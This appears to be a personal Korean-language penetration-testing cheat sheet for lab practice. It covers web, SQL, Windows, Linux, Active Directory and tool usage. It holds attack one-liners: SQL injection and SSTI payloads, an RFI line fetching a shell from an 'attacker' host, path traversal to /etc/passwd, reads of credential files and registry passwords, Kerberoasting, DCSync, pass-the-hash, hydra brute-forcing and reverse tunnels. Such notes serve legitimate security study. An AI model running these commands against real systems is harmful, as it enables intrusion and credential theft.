# 침투 테스트 통합 노트

<details>
  <summary><strong>web</strong></summary>

- whatweb / curl / burpsuite crawler 활용
- ⭐ **html code** 및 **JS code** 확인
- 페이지의 내용 먼저 확인
- `html`, `js` 보는 습관 들이기 *(04.15)*
- HTTP 응답 헤더 확인 (Server, X-Powered-By, X-Frame-Options 등 버전 정보)
- 소스코드 주석에서 힌트 확인 (`<!-- -->`)
- `/.well-known/` 경로 확인
- 페이지 내 숨겨진 input 필드 확인 (`type="hidden"`)
- 웹 프레임워크/언어 파악 (확장자, 헤더, 에러 메시지)

</details>

---
<details>
  <summary><strong>sql</strong></summary>

- injection / connect / enumeration / update
- Error-based / Boolean-based / Time-based / Union-based 구분하여 시도
- `'`, `"`, `)`, `--`, `#`, `/**/` 등 기본 페이로드 먼저
- `sqlmap -u <url> --dbs` / `--tables` / `--dump`
- 로그인 폼에서 `' OR 1=1--` 시도
- Second-order injection 가능성 고려
- NoSQL injection (MongoDB 등): `{"$gt": ""}` 형태 시도
  
</details>

---
<details>
  <summary><strong>ftp</strong></summary>

- upload / download / hidden files
- Anonymous 로그인 시도 (`anonymous` / 빈 패스워드)
- `binary` 모드로 파일 전송 (텍스트 모드에서 깨질 수 있음)
- 업로드 가능한 경우 web shell 업로드 후 웹 경로에서 접근 시도
- `ls -la`로 숨김 파일 확인
  
</details>

---
<details>
  <summary><strong>HTTP</strong></summary>

- `robots.txt` / `gobuster` / `feroxbuster` / `ffuf` 확인
- error page 확인
- cookie에 따라서 redirection 확인
- `.git` 확인 (nmap subdomain에서도)
- configuration file 위치 확인
- link 확인
- 서버 포트가 다르더라도 다른 포트에서 사용하는 언어에 맞는 web shell을 업로드 해볼 것
- burpsuite가 실패하는 경우가 있으니 `curl`로 시도해볼 것 *(04.22)*
- 특별한 정보 찾을 수 없을 때 api 검색 (login api)
- CMS를 알아낸 경우 다른 버전의 RCE를 참조해서 시도할 수 있는지 확인
- ⭐ **내부 내용 확인**
- URL에서 `+`는 공백을 의미하므로 정확하게 `+`를 전달하려면 `%2B`로 전달 *(04.04)*
- 특정 CMS를 찾았다고 해서 그것에만 매몰되면 안 된다 *(04.20)*
- 서버와 동일한 포트에서만 연결되도록 설정이 되어 있을 수 있으니 기존에 하던 대로 안되면 서버에서 열려있는 동일한 포트로 시도 *(04.20)*
- `/.git/config`, `/.git/HEAD`, `/.git/COMMIT_EDITMSG` 직접 접근 시도
- `git-dumper`로 `.git` 디렉토리 덤프
- `.env`, `.env.bak`, `.env.local` 파일 확인
- `wp-config.php`, `config.php`, `database.yml`, `settings.py` 등 설정 파일 경로 시도
- `backup.zip`, `backup.tar.gz`, `www.zip` 등 백업 파일 시도
- `phpinfo.php` 노출 여부 확인
- HTTP Method 변경 시도 (GET→POST, PUT, PATCH, DELETE, OPTIONS)
- `X-Forwarded-For: 127.0.0.1` 등 헤더 조작으로 접근 우회
- `Referer` 헤더 조작으로 접근 제한 우회
- 파라미터 타입 변경 (string → array: `param[]=value`)
- Path traversal: `../../../etc/passwd`
- LFI: `?page=../../../../etc/passwd`
- RFI: `?page=http://attacker/shell.php`
- SSRF: 내부 주소로 요청 유도 (`http://127.0.0.1`, `http://169.254.169.254` AWS metadata)
- JWT 토큰 확인: `alg: none` 변조, 시크릿 키 브루트포스
- API 엔드포인트 `/api/v1/`, `/api/v2/` 버전 변경 시도
- GraphQL: `__schema` introspection 쿼리로 스키마 덤프
- TLS 인증서 확인
- 인증서의 Subject Alternative Name(SAN)에서 서브도메인 수집
- 구버전 TLS (1.0, 1.1) 또는 취약한 cipher suite 확인 (`testssl.sh`)
- `sslscan`, `sslyze`로 취약점 확인

</details>

---
<details>
  <summary><strong>windows</strong></summary>

- ⭐⭐`administrator`라고 해서 확인하지 않는다는 것을 버려라 !⭐⭐
- `powershell`을 관리자 권한으로 실행시킬 수 있는지 확인.
- `powershell -ep bypass`
- ⭐`powershell history` 확인⭐
- 다른 유저의 `powershell history`파일도 확인해야 한다.
- `type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- `whoami` 확인
- `whoami /priv` — SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege 등 확인 → Potato 계열 공격
- `whoami /groups` — 속한 그룹 확인
- ⭐ **inside files (password leaking, source code, configurations)**
- public folder 확인
- 로컬로 어떻게든 접속이 가능하다면 Responder를 사용하여 해시 캡쳐 시도
- `dpapi` 폴더 확인 *(04.01)*
- `powershell` 리버스 셸 생성 시 따옴표 신경쓰기 *(04.01)*
- 리눅스에서 커널 버전을 확인하듯이 윈도우에서 패치 버전을 확인해서 취약점이 있는지 확인하여 권한 상승 시도 *(04.07)*
- 다음 패치 내역에서 어떤 취약점을 패치했는지를 확인하여 이전 버전에 적용 *(04.07)*
- `Program Files` 폴더 두 개 다 확인 *(04.23)*
- `systeminfo` — OS 버전, 패치 목록 확인
- `net user` / `net localgroup administrators` — 유저 및 관리자 그룹 확인
- `net share` — 공유 폴더 확인
- `netstat -ano` — 열린 포트 및 연결 확인
- `tasklist /svc` — 실행 중인 서비스 확인
- `sc query` — 서비스 목록 및 권한 확인
- `icacls <path>` — 파일/폴더 권한 확인 *(04.01)*
- `reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` — AutoAdminLogon, DefaultPassword 확인
- `reg query HKLM /f password /t REG_SZ /s` — 레지스트리에서 password 검색
- `C:\Users\<user>\AppData\Roaming\` 확인 (자격증명 저장 앱들)
- `C:\inetpub\wwwroot\` — IIS 웹루트 확인
- `C:\xampp\`, `C:\wamp\` 등 로컬 서버 설정 파일 확인
- AlwaysInstallElevated 레지스트리 확인:
  `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
  `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
- 서비스 바이너리 쓰기 권한 확인 (Unquoted Service Path)
- `C:\Windows\Panther\Unattend.xml`, `sysprep.xml` — 자동 설치 파일에 크레덴셜
- Credential Manager: `cmdkey /list`
- WinPEAS 실행하여 종합 점검

## POST EXPLOITATION
- 유저 계정으로 `winpeas` 실행시켜보기
- 셸을 획득할 때마다 내부 파일 살펴보기
- powershell history
- pypykatz/secretsdump
- mimikatz
  
</details>

---
<details>
  <summary><strong>linux</strong></summary>

- ⭐ **inside files (password leaking, source code, configurations)**
- `env` / open ports 확인
- ⭐ **who have permissions (root or user?)**
- - `LD_LIBRARY_PATH`가 잡혔을 때 특정한 프로그램에 대해서 하이재킹이 가능할 수 있다 *(04.29)*
- `ldd`로 확인해주기 *(04.29)*
- `/var/mail` 확인
- login user's group files 확인
- Unknown port → `telnet` 또는 `nc` banner grabbing → help
- `process` 확인 (`ps aux`로 어떤 프로그램이 실행되고 있는지 의심, 특히 브라우저)
- 현재 로그인 유저가 아니더라도 다른 유저의 파일들을 확인해서 권한 상승
- 루트 경로에서 리눅스에서 기본적으로 만들어진 폴더가 아닌 다른 폴더 확인
- Command Injection / Path Injection
- `/proc/self/environ` *(04.03)*
- `/proc/self/cwd` : Current Working Directory — `/proc/self/cwd/app.py` 이런 식으로 사용 가능 *(04.19)*
- 특정 포트가 열려 있을 때 `/etc/`에서 포트 번호로 찾아보기 *(04.15)*
- 리버스 셸 형성 시 끊기는 현상이 나타나면 `nohup`을 사용해서 셸 형성 *(04.15)*
- 시스템 정보를 확인해서 `x86`인지 `x64`인지 확인 *(04.17)*
- 쓰기 및 읽기 가능한 파일, 폴더 확인 (`find`로) *(04.27)*
- `crontab`에서 `run-parts`를 자주 보게 되는데, PATH Injection이 가능할지 모른다 *(04.27)*
- `history` 파일 확인 *(05.06)*
- `/etc/hostname`으로 hostname 확인 (Docker인지) *(04.10)*
- `root` 권한으로 읽을 수 있을 때 `/etc/shadow` 확인해서 비밀번호 확인 *(04.21)*
- `find . -type f 2>/dev/null` : 특정 폴더에서 권한이 없는 파일들은 출력하지 않으면서 찾는 명령어 *(04.09)*
- `id`로 발견한 그룹을 먼저 시도 *(04.24)*
- `sudo -l` — sudo 가능한 명령어 확인 → GTFOBins 참조
- `uname -a` — 커널 버전 확인 → 커널 익스플로잇 탐색
- `cat /etc/issue`, `cat /etc/os-release` — OS 버전 확인
- `cat /etc/passwd` — 유저 목록 및 홈 디렉토리 확인
- `cat /etc/crontab`, `ls /etc/cron.*` — 크론잡 확인
- `find / -perm -4000 -type f 2>/dev/null` — SUID 파일 탐색 → GTFOBins 참조
- `find / -perm -2000 -type f 2>/dev/null` — SGID 파일 탐색
- `find / -writable -type f 2>/dev/null` — 쓰기 가능한 파일 탐색
- `/etc/passwd` 쓰기 권한 확인 → 직접 root 계정 추가 가능
- `ss -tnlp` / `netstat -ano` — 내부 열린 포트 확인 (포트 포워딩 필요할 수 있음)
- `~/.ssh/id_rsa`, `~/.ssh/authorized_keys` 확인
- `.bash_history`, `.zsh_history`, `.sh_history` 확인
- `~/.bashrc`, `~/.bash_profile`, `~/.profile` — 환경 변수 및 alias 확인
- `/tmp`, `/dev/shm` — 쓰기 가능한 임시 디렉토리 (파일 업로드 위치)
- `cat /etc/exports` — NFS 설정 확인 (no_root_squash 취약점)
- `mount` / `df -h` — 마운트된 파일시스템 확인
- `lsof -i` — 열린 파일 및 네트워크 연결 확인
- `arp -a` / `ip neigh` — 내부 네트워크 호스트 탐색
- `/etc/hosts` 확인 — 내부 도메인/서브도메인 힌트
- `cat /etc/sudoers` — sudo 설정 직접 확인 (읽기 권한 있을 때)
- Capabilities 확인: `getcap -r / 2>/dev/null`
- `/var/log/` — 로그에서 크레덴셜 또는 힌트 탐색
- `wp-config.php`, `.env`, `config.yml` 등 웹 설정 파일에서 DB 크레덴셜
- Docker 소켓 확인: `/var/run/docker.sock` 쓰기 권한 → 컨테이너 탈출
- `id` 결과에 `docker`, `lxd`, `disk`, `adm`, `shadow` 그룹 포함 여부 확인
  
</details>

---
<details>
  <summary><strong>Active Directory</strong></summary>

- Privesc → return 고려
- `ntpdate`로 먼저 시간을 맞춰주고 시작
- 유저가 속해 있는 그룹을 잘 살펴보아야 한다
- 유저 목록 수집하여 소문자 버전도 시도
- `smbmap`에서 제대로 정보가 확인되지 않을 수 있어 `nxc`로 한 번 더 확인
- AD에서 특정 폴더 접근 가능 권한도 `icacls`로 확인 가능 *(04.01)*
- `rpcclient`에서 `administrator`가 안 나올 수 있으니 유저 리스트를 생성할 때 `administrator`를 고려 *(04.06)*
- BloodHound / SharpHound로 도메인 전체 관계 수집 및 공격 경로 탐색
- Kerberoasting: `GetUserSPNs.py` → TGS 티켓 획득 → hashcat 크랙 (`-m 13100`)
- AS-REP Roasting: `GetNPUsers.py` → pre-auth 불필요 계정 탐색 → hashcat 크랙 (`-m 18200`)
- Pass-the-Hash: `evil-winrm`, `psexec.py`, `wmiexec.py`
- Pass-the-Ticket: 티켓 export 후 재사용
- DCSync: `secretsdump.py` — Domain Admins 또는 DCSync 권한 있을 때
- `ldapsearch` / `ldapdomaindump` — 도메인 정보 열거
- `enum4linux-ng` — SMB/LDAP 통합 열거
- `nxc smb <target> --shares` — 공유 폴더 열거
- `nxc smb <target> --sessions` — 현재 세션 확인
- `nxc smb <target> -u users.txt -p passwords.txt` — 크레덴셜 스프레이
- `kerbrute` — 유저 열거 및 패스워드 스프레이
- `GetADUsers.py` — 도메인 유저 목록 수집
- ACL/ACE 확인: GenericAll, GenericWrite, WriteOwner, WriteDACL → 권한 남용
- Constrained / Unconstrained Delegation 확인
- LAPS 설정 여부 확인 (로컬 관리자 패스워드 자동 관리)
- GPO 쓰기 권한 확인 → GPO abuse
- `net user /domain` / `net group /domain` — 기본 도메인 열거
- SYSVOL / NETLOGON 공유에서 스크립트, 크레덴셜 확인
- `C:\Windows\NTDS\ntds.dit` — 도메인 해시 데이터베이스 (Volume Shadow Copy 활용)
- 도메인 내 DNS 확인: `nslookup`, `dig @<DC IP>`
  
</details>

---
<details>
  <summary><strong>SSH</strong></summary>

- `authorized_keys` 변경 여부 확인
- 접속한 셸에서 명령어가 실행되지 않을 수 있으니 SSH 접속 시도
- SSH를 새로 생성할 필요 없이 `.ssh` 폴더에서 `authorized_keys`만 생성해도 로그인 가능 *(04.13)*
- `~/.ssh/id_rsa` 파일 확인 (읽기 권한 있을 때 복사 후 로컬에서 접속)
- SSH 키 권한: `chmod 600 id_rsa` 필수
- 패스프레이즈 걸린 키: `ssh2john` → john / hashcat으로 크랙
- SSH config 파일 확인: `~/.ssh/config` — 다른 호스트 접속 정보
- Known hosts 확인: `~/.ssh/known_hosts` — 접속했던 호스트 목록
- `-L` 로컬 포트 포워딩 / `-R` 리모트 포트 포워딩 / `-D` SOCKS 프록시
- `ssh -i id_rsa user@host` 접속 시 `-o StrictHostKeyChecking=no` 옵션

</details>

---
<details>
  <summary><strong>도구</strong></summary>

### nmap
- `-sU --top-ports 100`
- `-Pn`
- `-sV -sC` — 버전 및 기본 스크립트 실행
- `-A` — OS 탐지, 버전, 스크립트, traceroute 종합
- `-p-` — 전체 포트 스캔
- `--script vuln` — 취약점 스크립트 실행
- `--script smb-enum-shares,smb-enum-users` — SMB 열거
- `-oA` 옵션으로 결과 저장 (나중에 참조)
- subdomain에서도 `.git` 확인

### ffuf
- `-mc all`
- http인지 https인지 제대로 확인
- `-w <wordlist> -u http://host/FUZZ`
- 서브도메인 퍼징: `-w subdomains.txt -u http://FUZZ.host.com -H "Host: FUZZ.host.com"`
- 파라미터 퍼징: `-w params.txt -u http://host/page?FUZZ=value`
- `-fs <size>` — 특정 크기 응답 필터링
- `-fc <code>` — 특정 상태 코드 필터링

### netexec (nxc)
- AD가 아니더라도 윈도우 환경에서 테스트
- ⭐ `--rid-brute`
- `--users` (description 확인)
- mssql의 경우 로컬 인증 방식을 사용하기 때문에 `--local-auth`를 붙여서 테스트해야 한다
- `nxc smb <target> -u '' -p ''` — Null 세션 테스트
- `nxc smb <target> -u guest -p ''` — Guest 계정 테스트
- `nxc winrm <target> -u user -p pass` — WinRM 접속 테스트
- `nxc mssql <target> -u user -p pass --sql "SELECT @@version"`

### grep
- `-r '@dog.htb'`
- 빈 줄 제외하고 나머지 출력: `grep .`
- `-i` — 대소문자 무시
- `-n` — 줄 번호 출력
- `-E` — 정규식 사용
- `grep -rn "password\|passwd\|secret\|key\|token" . 2>/dev/null` — 크레덴셜 키워드 검색

### strings
- raw data catch, flag recover, deleted files 복구
- 의심이 가는 파일의 경우 `strings`로 먼저 시도해보기
- 특정 파일 `exiftool`로 확인한 후 `strings`를 사용해서 문자 확인 (특히 image file) *(04.01)*
- `strings -n 8 <file>` — 최소 길이 지정으로 노이즈 줄이기

### gobuster
- `txt`, `md` 확장자
- `-k` (TLS)
- 경로를 못 찾을 때는 `feroxbuster` 사용해보기
- `gobuster`, `feroxbuster` 둘 다 돌려볼 필요 있음 *(04.05)*
- `gobuster`에서는 `-x` 옵션 없이 `-t 30`을 줘서 돌려보기 *(04.05)*
- 기본으로 돌린다고 생각해야 한다 *(05.02)*
- `gobuster dns -d domain.com -w subdomains.txt` — 서브도메인 탐색
- `-x php,html,txt,bak,old,zip,conf,config,js` — 확장자 목록

### feroxbuster
- 재귀로 파일을 찾다 보니 중요한 부분에서 경로만 탐색할 필요성 *(04.05)*
- `--depth 3` — 재귀 깊이 제한
- `--filter-status 404` — 특정 상태 코드 필터

### dirbuster
- ~2017년도까지 대체재

### wordlist
- `.git`
- `cgi-bin`
- `/usr/share/wordlists/rockyou.txt` — 패스워드 크랙
- `/usr/share/seclists/` — SecLists 전반적으로 활용
- `SecLists/Discovery/Web-Content/common.txt`
- `SecLists/Discovery/Web-Content/raft-medium-directories.txt`
- `SecLists/Usernames/Names/names.txt`
- `SecLists/Passwords/Common-Credentials/10k-most-common.txt`

### searchsploit
- 버전을 확인할 수 없어도 페이로드 시도
- Unauthenticated 취약점이 존재할 수 있으니 막히면 찾아보기
- 버전이 같지 않더라도 관리자 계정으로 실행되는 취약점을 다른 버전에서도 실행해볼 것
- `searchsploit -m <id>` — 로컬로 익스플로잇 복사
- `searchsploit --cve <CVE-ID>` — CVE로 검색

### Docker
- Docker 버전을 확인하여 Privesc 시도 *(04.10)*
- `Dockerfile`에 중요 정보 노출 *(04.10)*
- `docker ps`, `docker images` — 실행 중인 컨테이너/이미지 확인
- `/var/run/docker.sock` 접근 가능 시 컨테이너 탈출
- `docker inspect <container>` — 환경 변수, 마운트, 네트워크 확인
- `docker exec -it <container> /bin/bash` — 컨테이너 내부 접속
- `capsh --print` — 컨테이너 내 capabilities 확인

### burpsuite
- 요청 시 파라미터 전송(위)과 body 전송(아래) 바꿔서 전달해보기
- 이에 따라서 Content-Type을 바꿔야 할 수도 있음
- 요청 시 공백은 한 줄만
- burpsuite가 안될 때 `curl`로 시도해보기 *(04.22)*
- Intruder로 파라미터 퍼징 / Repeater로 수동 테스트
- Decoder로 인코딩/디코딩 (Base64, URL, HTML)
- `Content-Type: application/json` ↔ `application/x-www-form-urlencoded` 변환 시도

### hashcat / john
- `hashcat -m <mode> hash.txt rockyou.txt`
- `john --wordlist=rockyou.txt hash.txt`
- `hash-identifier` / `hashid` — 해시 타입 식별
- `--rules` 옵션으로 변형 룰 적용
- 자주 쓰는 모드: `-m 0` MD5, `-m 1000` NTLM, `-m 1800` sha512crypt, `-m 13100` Kerberoast, `-m 18200` AS-REP Roast

### hydra / medusa
- `hydra -l user -P rockyou.txt <protocol>://<target>`
- SSH: `hydra -L users.txt -P passwords.txt ssh://<target>`
- HTTP Form: `hydra -l admin -P rockyou.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`
- `-t 4` — 스레드 수 제한 (SSH는 낮게)

### impacket
- `psexec.py`, `wmiexec.py`, `smbexec.py` — 원격 코드 실행
- `secretsdump.py` — 해시 덤프
- `GetUserSPNs.py` — Kerberoasting
- `GetNPUsers.py` — AS-REP Roasting
- `smbclient.py` — SMB 파일 접근
- `mssqlclient.py` — MSSQL 접속

### evil-winrm
- `evil-winrm -i <ip> -u <user> -p <pass>`
- `-H <hash>` — Pass-the-Hash
- `-s <script_dir>` — PowerShell 스크립트 디렉토리
- `-e <exec_dir>` — 실행 파일 디렉토리

### chisel / socat (터널링)
- `chisel server -p 8000 --reverse` (공격자)
- `chisel client <attacker>:8000 R:8080:127.0.0.1:8080` (피해자)
- `socat TCP-LISTEN:4444,fork TCP:127.0.0.1:5555` — 포트 포워딩
- 내부망 포트 접근 시 활용

### man page
- 익숙하지 않은 프로그램의 경우 man page를 찾아볼 것

### image file
- `exiftool`
- `strings`
- `stegseek` / `steghide` — 스테가노그래피 확인
- `binwalk` — 파일 내 숨겨진 데이터 추출
- `zsteg` — PNG/BMP 스테가노그래피
- `file <filename>` — 실제 파일 타입 확인 (확장자 속임 가능)

### 압축 파일
- `unzip` → 실패 시 `7z` *(04.01)*
- `7z l <file>` — 내용 목록 확인
- `fcrackzip -u -D -p rockyou.txt file.zip` — zip 패스워드 크랙
- `zip2john file.zip > hash.txt` → john으로 크랙

### linpeas / winpeas
- 다운로드 없이 파이프 연결로 실행 *(04.13)*
- `LD_LIBRARY_PATH`가 잡혔을 때 특정한 프로그램에 대해서 하이재킹이 가능할 수 있다 *(04.29)*
- `ldd`로 확인해주기 *(04.29)*
- `-a` 옵션으로 모든 검사 실행
- 출력 결과를 파일로 저장: `linpeas.sh | tee /tmp/out.txt`

### pspy
- 비밀번호 캡쳐가 될 때 제대로 안 나오는 경우가 있으니 상시 돌리고 후에 확인 *(05.02)*
- root가 실행하는 크론잡, 스크립트 모니터링

### git
- `git diff --cached <file>` : 커밋 되기 전인 스테이징과 최신 커밋과의 해당 파일의 차이를 나타냄 *(04.10)*
- `git log --oneline` — 커밋 히스토리 확인
- `git show <commit>` — 특정 커밋 내용 확인
- `git stash list` / `git stash show -p` — stash에 숨겨진 내용 확인

### SNMP
- SNMP 있을 경우 config file 살펴보기 *(04.10)*
- `snmpwalk -c public -v1 <target>` — community string public으로 열거
- `onesixtyone -c community.txt <target>` — community string 브루트포스
- `snmp-check <target>` — SNMP 정보 종합 수집

### tcpdump / wireshark
- `tcpdump -i <interface> -w capture.pcap`
- `tcpdump -i any port 80 -A` — HTTP 트래픽 텍스트 출력
- 네트워크 트래픽에서 크레덴셜, 해시 캡쳐

  
</details>

---

## 입력 / 공격 일반
- ⭐ **모든 공격을 전부 시도해봐야 한다**
- 우회를 시도하여서 다른 공격 방법 테스트 (command injection만 우회가 되는 것이 아니다)
- 우선순위를 먼저 테스트해봐야 한다
- 만약에 링크를 통해서 서버로 전송이 요청된다면 XSRF 공격이 가능할 수도 있다
- code script에서 입력 검증이 제대로 되고 있는지 확인
- 날짜에 따라서 IDOR이 가능할 수 있다
- banner grabbing: `nc` 혹은 `telnet`을 사용할 경우 버전 출력에 시간이 좀 걸릴 수 있다
- `POST` 요청에서 데이터가 없을 경우에 요청이 실패하는 경우가 발생 *(04.22)*
- 웹에서 업로드를 통해서 셸을 얻었다고 해서 서버가 취약하지 않을 것이라는 생각을 버려야 한다 *(04.21)*
- 버전 정보가 맞지 않더라도 exploit을 시도해봐야 한다 *(04.21)*
- 획득한 정보 모두를 실행해보아야 한다 *(04.22)*
- 출력된 모든 것들 중에 정보가 있을 수 있으니 천천히 확인할 것 *(04.06)*
- 무작정 찾기보다 먼저 사용해보고 나서 찾아보기 *(04.09)*
- cleanup script가 있을 경우 이전 명령어를 다시 실행해서 시도해야 할 수 있음 *(04.07)*
- 웹서버에서 기존 경로가 아닌 경로를 잘 생각해야 한다 *(04.24)*
- 파이썬에서 특정 모듈을 다운로드 받아서 테스트를 시도할 수 있다 *(04.04)*
- default credential 찾아보기 *(04.10)*
- 파일 소유주가 누구인지 확인할 것 *(04.10)*
- `bash`는 언어와 달리 모든 것이 명령어라서 `if`문 안에서 변수를 명령어로 바꾼다면 명령어로 작동할 수 있다 *(04.10)*
- `bash`에서 `exit` 명령어 이후는 실행되지 않는다 *(04.27)*
- IDOR: 숫자 ID 파라미터를 바꿔가며 다른 유저 데이터 접근
- XXE: XML 입력 처리하는 곳에서 외부 엔티티 삽입 시도
- SSTI: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` 등 템플릿 인젝션 탐지
- 파일 업로드 우회: 확장자 변경 (`.php` → `.php5`, `.phtml`, `.pHp`), MIME 타입 변조, 이중 확장자 (`shell.php.jpg`), null byte (`shell.php%00.jpg`)
- 크레덴셜 재사용 — 획득한 패스워드를 다른 서비스/유저에도 시도
- 패스워드 변형 시도: `Password1`, `Password123`, `Password!`, `P@ssw0rd`
- 서비스별 기본 포트 암기: FTP(21), SSH(22), SMTP(25), DNS(53), HTTP(80), SMB(445), MSSQL(1433), MySQL(3306), RDP(3389), WinRM(5985/5986)

<img width="1010" height="151" alt="image" src="https://github.com/user-attachments/assets/e711e3f2-1700-4c9e-a7ef-ab02b8c2d85e" />

